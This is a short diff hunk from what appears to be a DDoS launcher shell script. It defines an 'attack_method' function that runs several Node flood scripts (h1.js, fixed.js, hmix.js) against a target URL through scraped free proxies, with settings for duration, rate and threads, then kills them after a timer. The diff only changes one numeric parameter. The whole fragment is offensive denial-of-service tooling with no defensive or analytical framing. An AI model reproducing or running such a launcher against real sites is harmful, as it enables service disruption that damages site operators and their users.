@@ -15,7 +15,7 @@ curl -s 'https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_prox
 attack_method() {
   METHOD=$1
   node h1.js "$METHOD" "$URL" live.txt "$TIME" "$RATE" "$THREADS" randomstring=true & PID1=$!
-  node fixed.js "$URL" "$TIME" 48 1 kaka.txt --verify true & PID3=$!
+  node fixed.js "$URL" "$TIME" 40 1 kaka.txt --verify true & PID3=$!
   #node hmix.js -m "$METHOD" -u "$URL" -s "$TIME" -p "$PFILE" -t "$THREADS" -r "$RATE" --full true -d false & PID2=$!
   sleep "$TIME"; kill -9 $PID1 $PID2 $PID3 2>/dev/null
 }
